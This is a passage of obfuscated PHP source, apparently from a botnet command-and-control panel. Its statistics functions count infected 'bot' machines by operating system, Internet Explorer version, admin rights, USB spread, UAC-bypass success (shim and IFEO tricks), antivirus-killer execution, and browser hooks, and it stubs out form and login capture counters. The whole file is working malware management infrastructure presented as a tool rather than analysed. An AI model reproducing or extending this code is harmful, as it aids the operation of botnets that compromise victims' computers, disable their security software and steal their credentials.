        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_HAS_SAMSUNG_DEVICE . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsWithAppleDevices($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_HAS_APPLE_DEVICE . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsWithAdmin($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_IS_ELEVATED . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsThatRequireTricks($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_UAC_REQUIRES_TRICK . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetBotsThatWereTricked($groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".clients WHERE ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_UAC_TRICK_WORKED . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalFormCaptures()
    {
        return 0;
    }
    public function Stats_GetTotalLoginCaptures()
    {
        return 0;
    }
    public function Stats_GetOnlineInfo(&$Num_Online, &$Num_Online_3h, &$Num_Online_24h, &$Num_Online_2d, &$Num_Online_3d, &$Num_Online_4d, &$Num_Online_5d, &$Num_Online_7d, &$Num_New_24h, &$Num_New_USB_24h, &$Num_Offline, &$Num_Dead, $use_min_stats = false, $groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D0A341E2C22260F211F06063B0E162A2B250E35012801_ = time() - 3600 * 3;
        $_obfuscated_0D34251D161F1611352A2D18061E2C173512300B273B22_ = time() - 84600;
        $_obfuscated_0D5C322A143D321422152B36173F0F3D2E3B1E34382101_ = time() - 84600 * 2;
        $_obfuscated_0D1B3B14081B32095C2638272B021A081C333112320501_ = time() - 84600 * 3;
        $_obfuscated_0D31042C241B0A0616172B33333C4015120140043E0532_ = time() - 84600 * 4;
        $_obfuscated_0D16055B1F26342B5C3E17152B1E101B262F1E29322B22_ = time() - 84600 * 5;
        $_obfuscated_0D1540382902342A021B36033B1F11223727133C263311_ = time() - 84600 * 7;
        if ($use_min_stats == false) {
            $_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_ = "SELECT\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > " . $_obfuscated_0D0A341E2C22260F211F06063B0E162A2B250E35012801_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS '3h',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > " . $_obfuscated_0D34251D161F1611352A2D18061E2C173512300B273B22_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS '24h',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > " . $_obfuscated_0D5C322A143D321422152B36173F0F3D2E3B1E34382101_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS '2d',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > " . $_obfuscated_0D1B3B14081B32095C2638272B021A081C333112320501_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS '3d',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > " . $_obfuscated_0D31042C241B0A0616172B33333C4015120140043E0532_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS '4d',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > " . $_obfuscated_0D16055B1F26342B5C3E17152B1E101B262F1E29322B22_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS '5d',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > " . $_obfuscated_0D1540382902342A021B36033B1F11223727133C263311_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS '7d',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE FirstCheckIn > " . $_obfuscated_0D34251D161F1611352A2D18061E2C173512300B273B22_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'new_24h',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE (FirstCheckIn > " . $_obfuscated_0D34251D161F1611352A2D18061E2C173512300B273B22_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' AND ClientAttributes & " . BOT_ATTRIBUTE_BOT_SOURCE_USB . ") " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'new_24h_usb',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus = '" . BOT_STATUS_OFFLINE . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'is_offline',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus = '" . BOT_STATUS_ONLINE . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'is_online',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE (ClientStatus = '" . BOT_STATUS_DEAD . "' OR ClientStatus = '" . BOT_STATUS_DELETED . "') " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'is_dead'";
        } else {
            $_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_ = "SELECT\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > " . $_obfuscated_0D0A341E2C22260F211F06063B0E162A2B250E35012801_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS '3h',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE LastCheckIn > " . $_obfuscated_0D34251D161F1611352A2D18061E2C173512300B273B22_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS '24h',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE FirstCheckIn > " . $_obfuscated_0D34251D161F1611352A2D18061E2C173512300B273B22_ . " AND ClientStatus < '" . BOT_STATUS_DEAD . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'new_24h',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus = '" . BOT_STATUS_OFFLINE . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'is_offline',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus = '" . BOT_STATUS_ONLINE . "' " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'is_online',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE (ClientStatus = '" . BOT_STATUS_DEAD . "' OR ClientStatus = '" . BOT_STATUS_DELETED . "') " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'is_dead'";
        }
        $result = parent::Query($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_);
        if ($result && ($row = mysql_fetch_assoc($result))) {
            $Num_Online = $row["is_online"];
            $Num_Online_3h = $row["3h"];
            $Num_Online_24h = $row["24h"];
            if ($use_min_stats == false) {
                $Num_Online_2d = $row["2d"];
                $Num_Online_3d = $row["3d"];
                $Num_Online_4d = $row["4d"];
                $Num_Online_5d = $row["5d"];
                $Num_Online_7d = $row["7d"];
                $Num_New_24h = $row["new_24h"];
                $Num_New_USB_24h = $row["new_24h_usb"];
            } else {
                $Num_Online_2d = 0;
                $Num_Online_3d = 0;
                $Num_Online_4d = 0;
                $Num_Online_5d = 0;
                $Num_Online_7d = 0;
                $Num_New_24h = 0;
                $Num_New_USB_24h = 0;
            }
            $Num_Offline = $row["is_offline"];
            $Num_Dead = $row["is_dead"];
            return true;
        }
        return false;
    }
    public function Stats_Build_ClientStatus_Query($req_ClientStatus, $req_ClientStatus_Operator, $bBeginWithAND)
    {
        $_obfuscated_0D351C1A0F29110C391429360328131532233D0E0A1522_ = "<";
        $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ = "";
        if ($req_ClientStatus == BOT_STATUS_NO_STATUS_SPECIFIED || !is_numeric($req_ClientStatus) || !is_numeric($req_ClientStatus_Operator)) {
            $req_ClientStatus = BOT_STATUS_DEAD;
            $req_ClientStatus_Operator = STATS_INTEGER_FIELD_OPERATOR_LESS_THAN;
        }
        switch ((int) $req_ClientStatus_Operator) {
            case STATS_INTEGER_FIELD_OPERATOR_LESS_THAN:
                $_obfuscated_0D351C1A0F29110C391429360328131532233D0E0A1522_ = "<";
                break;
            case STATS_INTEGER_FIELD_OPERATOR_GREATER_THAN:
                $_obfuscated_0D351C1A0F29110C391429360328131532233D0E0A1522_ = ">";
                break;
            case STATS_INTEGER_FIELD_OPERATOR_GREATER_THAN_OR_EQUAL_TO:
                $_obfuscated_0D351C1A0F29110C391429360328131532233D0E0A1522_ = ">=";
                break;
            case STATS_INTEGER_FIELD_OPERATOR_LESS_THAN_OR_EQUAL_TO:
                $_obfuscated_0D351C1A0F29110C391429360328131532233D0E0A1522_ = "<=";
                break;
            default:
                $_obfuscated_0D351C1A0F29110C391429360328131532233D0E0A1522_ = "<";
                break;
        }
        if ($bBeginWithAND == true) {
            $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ = " AND ";
        }
        $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ .= "ClientStatus " . $_obfuscated_0D351C1A0F29110C391429360328131532233D0E0A1522_ . " " . (int) $req_ClientStatus . " ";
        return $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_;
    }
    public function Stats_GetComponents(&$Num_DotNet, &$Num_Java, &$Num_Phones, &$Num_Admin, &$Num_TricksNeeded, &$Num_TricksWorked, &$Num_AVKExecuted, $use_min_stats, $GroupName, $req_ClientStatus, $req_ClientStatus_Operator)
    {
        $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ = $this->Stats_Build_ClientStatus_Query($req_ClientStatus, $req_ClientStatus_Operator, false);
        $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ = $this->FormatGroupQueryString($GroupName);
        $_obfuscated_0D051D3E052C32311E26400428261F1B1B083E161F2811_ = "";
        $_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_ = NULL;
        $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_ = NULL;
        if ($use_min_stats == true) {
            $Num_DotNet = 0;
            $Num_Java = 0;
            $Num_Phones = 0;
            $Num_Admin = 0;
            $Num_TricksNeeded = 0;
            $Num_TricksWorked = 0;
            return false;
        }
        $_obfuscated_0D051D3E052C32311E26400428261F1B1B083E161F2811_ = "SELECT\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND ClientAttributes & " . BOT_ATTRIBUTE_HAS_NET_FRAMEWORK . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'NET',\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND ClientAttributes & " . BOT_ATTRIBUTE_HAS_JAVA . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'JAVA',\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND (ClientAttributes & " . BOT_ATTRIBUTE_HAS_SAMSUNG_DEVICE . " OR ClientAttributes & " . BOT_ATTRIBUTE_HAS_APPLE_DEVICE . ") " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'PHONE',\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND ClientAttributes & " . BOT_ATTRIBUTE_IS_ELEVATED . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'ADMIN',\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND ClientAttributes & " . BOT_ATTRIBUTE_UAC_REQUIRES_TRICK . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'TRICKNEED',\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND ClientAttributes & " . BOT_ATTRIBUTE_UAC_TRICK_WORKED . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'TRICKWORK',\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND ClientAttributes & " . BOT_ATTRIBUTE_TRICK_WORKED_USED_SHIM_TRICK . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'TRICKWORK_SHIM',\r\n\t\t\t\t\t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND ClientAttributes & " . BOT_ATTRIBUTE_TRICK_WORKED_USED_IFEO_TRICK . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'TRICKWORK_IFEO',\r\n\t\t\t\t  \t  (SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND ClientAttributes & " . BOT_ATTRIBUTE_AVKILL_HAS_EXECUTED . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'AVK_EXECUTED'";
        $_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_ = parent::Query($_obfuscated_0D051D3E052C32311E26400428261F1B1B083E161F2811_);
        if ($_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_ && ($_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_ = mysql_fetch_assoc($_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_))) {
            $Num_DotNet = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["NET"];
            $Num_Java = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["JAVA"];
            $Num_Phones = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["PHONE"];
            $Num_Admin = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["ADMIN"];
            $Num_TricksNeeded = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["TRICKNEED"];
            $Num_TricksWorked = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["TRICKWORK"];
            $_obfuscated_0D141E2F0B2E0313301B0C05220A3C04330C26312F2A11_ = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["TRICKWORK_SHIM"];
            $_obfuscated_0D31051426143529063E30195B09101D3828233B380C32_ = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["TRICKWORK_IFEO"];
            $Num_AVKExecuted = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["AVK_EXECUTED"];
            return true;
        }
        return false;
    }
    public function Stats_GetOS(&$Num_W10, &$Num_W81, &$Num_W8, &$Num_W7, &$Num_Vista, &$Num_XP, &$Num_WS2008, &$Num_WS2003, &$Num_Unknown, &$Num_x86, &$Num_x64, $use_min_stats, $groupname, $req_ClientStatus, $req_ClientStatus_Operator)
    {
        $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ = $this->Stats_Build_ClientStatus_Query($req_ClientStatus, $req_ClientStatus_Operator, false);
        $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D051D3E052C32311E26400428261F1B1B083E161F2811_ = "";
        $_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_ = NULL;
        $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_ = NULL;
        if ($use_min_stats == true) {
            $Num_W10 = 0;
            $Num_W81 = 0;
            $Num_W8 = 0;
            $Num_W7 = 0;
            $Num_Vista = 0;
            $Num_XP = 0;
            $Num_WS2003 = 0;
            $Num_WS2008 = 0;
            $Num_x86 = 0;
            $Num_x64 = 0;
            $Num_Unknown = 0;
            return false;
        }
        $_obfuscated_0D051D3E052C32311E26400428261F1B1B083E161F2811_ = "SELECT\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND OS & " . WINDOWS_VERSION_S2003 . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'S2003',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND (OS & " . WINDOWS_VERSION_S2008 . " OR OS & " . WINDOWS_VERSION_S2008R2 . ") " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'S2008',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND OS & " . WINDOWS_VERSION_XP . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'XP',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND OS & " . WINDOWS_VERSION_VS . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'VS',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND OS & " . WINDOWS_VERSION_W7 . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'W7',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND OS & " . WINDOWS_VERSION_W8 . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'W8',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND OS & " . WINDOWS_VERSION_W8 . " AND OS & " . WINDOWS_VERSION_SP_SP1 . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'W81',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND OS & " . WINDOWS_VERSION_W10 . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'W10',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND OS & " . WINDOWS_VERSION_BIT_32 . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'x86',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE " . $_obfuscated_0D3D180E352B0D235B3106091705152E3734380E022D32_ . " AND OS & " . WINDOWS_VERSION_BIT_64 . " " . $_obfuscated_0D1B0E145B392B165C1A02135B2B0F17363C1B1C051732_ . ") AS 'x64'";
        $_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_ = parent::Query($_obfuscated_0D051D3E052C32311E26400428261F1B1B083E161F2811_);
        if ($_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_ && ($_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_ = mysql_fetch_assoc($_obfuscated_0D280D162608341C3218382B361F3E3B1D1618121C3F11_))) {
            $Num_W10 = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["W10"];
            $Num_W81 = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["W81"];
            $Num_W8 = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["W8"];
            $Num_W7 = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["W7"];
            $Num_Vista = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["VS"];
            $Num_XP = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["XP"];
            $Num_WS2003 = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["S2003"];
            $Num_WS2008 = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["S2008"];
            $Num_x86 = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["x86"];
            $Num_x64 = $_obfuscated_0D15192A313E3E090E23262F36181A193924312D193011_["x64"];
            $Num_Unknown = 0;
            return true;
        }
        return false;
    }
    public function Stats_GetIEVersions(&$uIE7, &$uIE8, &$uIE9, &$uIE10, &$uIE11, &$uIEOther, $groupname = "")
    {
        $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ = $this->FormatGroupQueryString($groupname);
        $_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_ = "SELECT\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus<0x00000004 AND WebAttributes & " . WEB_ATTRIBUTE_IE_VERSION_7 . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'ie7',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus<0x00000004 AND WebAttributes & " . WEB_ATTRIBUTE_IE_VERSION_8 . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'ie8',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus<0x00000004 AND WebAttributes & " . WEB_ATTRIBUTE_IE_VERSION_9 . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'ie9',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus<0x00000004 AND WebAttributes & " . WEB_ATTRIBUTE_IE_VERSION_10 . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'ie10',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus<0x00000004 AND WebAttributes & " . WEB_ATTRIBUTE_IE_VERSION_11 . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'ie11',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus<0x00000004 AND WebAttributes & " . WEB_ATTRIBUTE_IE_VERSION_OTHER . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'ieOther',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . $this->pdbname . ".clients WHERE ClientStatus<0x00000004 AND WebAttributes & " . WEB_ATTRIBUTE_HOOKS_ALREADY_EXIST . " " . $_obfuscated_0D1B1E012E5C0D153E050B213D021C2F14142431132822_ . ") AS 'hooks_exist'";
        $result = parent::Query($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_);
        if ($result && ($row = mysql_fetch_assoc($result))) {
            $uIE7 = $row["ie7"];
            $uIE8 = $row["ie8"];
            $uIE9 = $row["ie9"];
            $uIE10 = $row["ie10"];
            $uIE11 = $row["ie11"];
            $uIEOther = $row["ieOther"];
            return true;
        }
        return false;
    }
}

?>